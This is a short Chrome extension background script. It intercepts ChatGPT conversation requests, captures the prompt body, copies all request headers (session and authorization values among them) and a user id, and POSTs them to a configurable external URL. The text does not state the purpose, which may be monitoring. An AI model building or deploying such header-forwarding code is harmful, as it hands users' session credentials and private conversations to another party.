let userId = ''
let Headers = ''
let base_url=''

chrome.webRequest.onBeforeRequest.addListener((req)=>{
    const content= new TextDecoder().decode(req.requestBody.raw[0].bytes)
    body = content
    chrome.storage.local.get('base_url',(obj)=>{
        
    base_url=obj.base_url;
     console.log("URL:??",base_url)   
   
    const id = setInterval(()=>{
   
    if(userId!=''&&Headers!=''&&base_url){
        console.log('Sending to API')
        sendToAPI(body, Headers, id,userId)
    }
},2000)
})
},{urls:["https://chat.openai.com/backend-api/conversation"]},['requestBody', 'extraHeaders'])

chrome.webRequest.onBeforeRequest.addListener((req)=>{
    const content= new TextDecoder().decode(req.requestBody.raw[0].bytes)
    user = JSON.parse(content).userId
    userId = user;
},{urls:["https://chat.openai.com/ces/v1/t"]},['requestBody', 'extraHeaders'])






chrome.webRequest.onBeforeSendHeaders.addListener(
    (req)=>{
      let hds = {}
    req.requestHeaders.forEach((item)=>{
        hds[item.name]=item.value
        })
      Headers = hds;
    },
    { urls: ['https://chat.openai.com/backend-api/conversation'] },
    ['requestHeaders','extraHeaders']
  );

function sendToAPI(b,h,id,uid){
    console.log("Calling",base_url)
    h['Content-Type']='application/json'
    h["knostic-id"]=uid
    fetch(base_url,{method:"POST",headers:h,body:JSON.stringify(b)}).then(()=>{clearInterval(id);body='';Headers='';})
}